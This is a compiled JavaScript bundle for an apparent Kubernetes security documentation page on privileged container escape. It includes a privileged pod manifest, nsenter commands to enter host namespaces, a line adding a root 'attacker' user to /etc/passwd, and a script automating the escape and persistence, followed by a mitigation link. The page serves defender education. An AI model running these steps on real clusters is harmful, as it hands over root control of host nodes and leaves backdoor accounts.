"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[222],{218:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>h,frontMatter:()=>i,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"attack_vectors/privileged_container_escape","title":"Container Escape","description":"How an attacker can break out of a container and gain control over the host system in Kubernetes.","source":"@site/docs/attack_vectors/privileged_container_escape.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/privileged_container_escape","permalink":"/docs/attack_vectors/privileged_container_escape","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742903175000,"sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Container Escape","description":"How an attacker can break out of a container and gain control over the host system in Kubernetes."},"sidebar":"default","previous":{"title":"Misconfigured Admission Controllers","permalink":"/docs/attack_vectors/misconfigured_admission_controllers"},"next":{"title":"Denial of Service (DoS) Attacks","permalink":"/docs/attack_vectors/ddos_attacks"}}');var a=t(4848),o=t(8453);const i={sidebar_position:8,title:"Container Escape",description:"How an attacker can break out of a container and gain control over the host system in Kubernetes."},r="Container Escape",c={},l=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"Deploy a Privileged Pod",id:"deploy-a-privileged-pod",level:3},{value:"Option 1: Escape Using Manual Namespace Entry",id:"option-1-escape-using-manual-namespace-entry",level:3},{value:"1. Check the Container Environment",id:"1-check-the-container-environment",level:4},{value:"2. Enter Host Namespaces with <code>nsenter</code>",id:"2-enter-host-namespaces-with-nsenter",level:4},{value:"3. Create a Persistent Root User",id:"3-create-a-persistent-root-user",level:4},{value:"Option 2: Run an Automated Escape Script",id:"option-2-run-an-automated-escape-script",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"container-escape",children:"Container Escape"})}),"\n",(0,a.jsxs)(n.p,{children:["A ",(0,a.jsx)(n.strong,{children:"container escape"})," occurs when an attacker breaks out of the container isolation boundary and gains access to the underlying host system. This leads to a full compromise of the node, potentially including root access, system tampering, and lateral movement across the cluster."]}),"\n",(0,a.jsx)(n.hr,{}),"\n",(0,a.jsx)(n.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,a.jsxs)(n.p,{children:["An attacker targets a misconfigured container with elevated privileges. The following pod manifest is a ",(0,a.jsx)(n.strong,{children:"prerequisite"})," for all container escape paths, as it grants the attacker access to sensitive host namespaces and kernel features."]}),"\n",(0,a.jsx)(n.h3,{id:"deploy-a-privileged-pod",children:"Deploy a Privileged Pod"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  hostPID: true\n  containers:\n    - image: busybox\n      name: test\n      command: ["sleep", "infinity"]\n      securityContext:\n        runAsUser: 0\n        allowPrivilegeEscalation: true\n        privileged: true\n  restartPolicy: Always\n'})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"kubectl apply -f test-pod.yaml\n"})}),"\n",(0,a.jsx)(n.p,{children:"Once the privileged pod is running, the attacker proceeds using one of the following options."}),"\n",(0,a.jsx)(n.hr,{}),"\n",(0,a.jsx)(n.h3,{id:"option-1-escape-using-manual-namespace-entry",children:"Option 1: Escape Using Manual Namespace Entry"}),"\n",(0,a.jsx)(n.h4,{id:"1-check-the-container-environment",children:"1. Check the Container Environment"}),"\n",(0,a.jsx)(n.p,{children:"Verify if the container has access to the host\u2019s mount namespace:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ls -l /proc/1/ns/mnt\n"})}),"\n",(0,a.jsx)(n.p,{children:"Inspect if the host filesystem is visible:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ls /proc/1/root\n"})}),"\n",(0,a.jsxs)(n.h4,{id:"2-enter-host-namespaces-with-nsenter",children:["2. Enter Host Namespaces with ",(0,a.jsx)(n.code,{children:"nsenter"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh\n"})}),"\n",(0,a.jsx)(n.p,{children:"Verify the escape by checking:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"hostname\nwhoami\n"})}),"\n",(0,a.jsxs)(n.p,{children:["If the hostname matches the host and the user is ",(0,a.jsx)(n.code,{children:"root"}),", the escape was successful."]}),"\n",(0,a.jsx)(n.h4,{id:"3-create-a-persistent-root-user",children:"3. Create a Persistent Root User"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd\ngrep attacker /etc/passwd\n"})}),"\n",(0,a.jsx)(n.hr,{}),"\n",(0,a.jsx)(n.h3,{id:"option-2-run-an-automated-escape-script",children:"Option 2: Run an Automated Escape Script"}),"\n",(0,a.jsx)(n.p,{children:"Instead of manually running commands, the attacker may use a single script to automate the escape and persistence steps:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'#!/bin/sh\n\necho "[*] Checking if the container has access to the host\'s root filesystem..."\nif [ ! -d "/proc/1/root" ]; then\n    echo "[-] Cannot access /proc/1/root. Escape is not possible."\n    exit 1\nfi\n\necho "[+] Host root filesystem detected at /proc/1/root."\necho "[*] Attempting to enter the host\'s namespaces..."\n\nexec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c \'\n    echo "[+] Successfully entered host namespaces."\n    echo "[*] Adding attacker user to /etc/passwd..."\n    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd\n    grep attacker /etc/passwd\n    echo "[*] Checking system state..."\n    echo "Hostname: $(hostname)"\n    echo "User: $(whoami)"\n    ps aux | grep kubelet\n    exec /bin/sh\n\'\n'})}),"\n",(0,a.jsx)(n.hr,{}),"\n",(0,a.jsx)(n.h3,{id:"result",children:"Result"}),"\n",(0,a.jsxs)(n.p,{children:["The attacker achieves ",(0,a.jsx)(n.strong,{children:"interactive root access on the host node"}),". This breaks the container isolation model and enables full control over the host, including the ability to persist, modify system configurations, and pivot to other parts of the cluster."]}),"\n",(0,a.jsx)(n.hr,{}),"\n",(0,a.jsx)(n.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,a.jsxs)(n.p,{children:["\u27a1 ",(0,a.jsx)(n.a,{href:"/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation",children:"Preventing Container Escape"})]})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>r});var s=t(6540);const a={},o=s.createContext(a);function i(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);